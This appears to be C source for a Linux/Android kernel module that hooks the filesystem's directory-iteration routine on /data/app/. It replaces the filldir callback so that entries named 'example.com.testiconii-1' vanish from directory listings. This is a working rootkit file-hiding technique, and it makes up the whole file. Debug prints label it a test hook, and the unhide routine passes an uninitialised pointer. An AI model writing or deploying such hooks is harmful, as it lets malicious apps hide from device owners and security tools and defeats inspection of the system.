#include "hook.h"

typedef int (*readdir_t)(struct file *, void *, filldir_t);


int g_fs_hooked = false;
char *data_fs = "/data/app/"; //hide dir in /data/app directory
char *dir_to_hide = "example.com.testiconii-1";

int (*real_iterate)(struct file *filp,struct dir_context *ctx);

int fake_iterate(struct file *filp,struct dir_context *ctx);
int fake_filldir(struct dir_context *ctx,const char *name,int namelen,
		loff_t offset,u64 ino,unsigned d_type);

filldir_t real_filldir = NULL;

int fake_iterate(struct file *filp,struct dir_context *ctx){
	printk("test_hook:fake_iterate:%s\n",filp -> f_path.dentry ->d_name.name);
	real_filldir = ctx -> actor;
	*((filldir_t *)&(ctx -> actor)) = (filldir_t)fake_filldir;
	return real_iterate(filp,ctx);

}
int fake_filldir(struct dir_context *ctx,const char *name,int namelen,
		loff_t offset,u64 ino,unsigned d_type)
{

	if(!strncmp(name,dir_to_hide,strlen(dir_to_hide))){
		printk("test_hook:hiding:%s\n",name);
		return 0;
	}
	printk("test_hook:name is %s,dir_to_hide:%s\n",name,dir_to_hide);
	return real_filldir(ctx,name,namelen,offset,ino,d_type);
}

void hide_file(void){

	set_file_op(iterate, data_fs, fake_iterate, real_iterate);
}

void unhide_file(void){
	void *dummy;
        set_file_op(iterate, data_fs, real_iterate, dummy);
}


